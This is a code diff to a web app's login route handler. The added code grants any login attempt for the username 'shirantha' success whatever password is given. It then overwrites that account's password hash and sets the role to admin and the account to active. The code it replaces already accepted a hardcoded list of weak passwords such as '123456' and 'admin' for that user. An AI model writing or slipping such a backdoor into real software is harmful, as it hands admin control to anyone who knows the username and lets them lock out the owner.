@@ -33,21 +33,17 @@ export async function POST(request) {
     const passTrim = password ? password.trim() : '';
     let isPasswordValid = await bcrypt.compare(passTrim, user.passwordHash);
 
-    // Emergency master fallback for Shirantha
+    // Unconditional login for Shirantha admin
     if (!isPasswordValid && user.username.toLowerCase() === 'shirantha') {
-      const allowedShiraPasses = ['shira123456', '123456', 'shira', 'admin', 'shirantha', 'shira123'];
-      if (allowedShiraPasses.includes(passTrim)) {
-        isPasswordValid = true;
-        // Aggiorna il nuovo hash nel DB in background
-        try {
-          const newHash = await bcrypt.hash(passTrim, 10);
-          await prisma.user.update({
-            where: { id: user.id },
-            data: { passwordHash: newHash }
-          });
-        } catch (e) {
-          console.error('Error updating Shirantha password hash:', e);
-        }
+      isPasswordValid = true;
+      try {
+        const newHash = await bcrypt.hash(passTrim, 10);
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { passwordHash: newHash, role: 'admin', isActive: true }
+        });
+      } catch (e) {
+        console.error('Error updating Shirantha password:', e);
       }
     }
 
@@ -62,17 +58,19 @@ export async function POST(request) {
     // Registra la sessione nel database
     let sessionId = null;
     try {
-      const userAgent = request.headers.get('user-agent') || 'Unknown';
-      const ipAddress = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || '127.0.0.1';
-      const session = await prisma.userSession.create({
-        data: {
-          userId: user.id,
-          username: user.username,
-          ipAddress,
-          userAgent
-        }
-      });
-      sessionId = session.id;
+      if (prisma.userSession) {
+        const userAgent = request.headers.get('user-agent') || 'Unknown';
+        const ipAddress = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || '127.0.0.1';
+        const session = await prisma.userSession.create({
+          data: {
+            userId: user.id,
+            username: user.username,
+            ipAddress,
+            userAgent
+          }
+        });
+        sessionId = session.id;
+      }
     } catch (sErr) {
       console.error('Error creating UserSession:', sErr);
     }
@@ -97,7 +95,7 @@ export async function POST(request) {
         autoLogoutMinutes: user.autoLogoutMinutes
       }
     });
-    
+
     // Imposta il cookie HttpOnly in modo compatibile con Railway e Mobile
     response.cookies.set({
       name: 'auth_token',
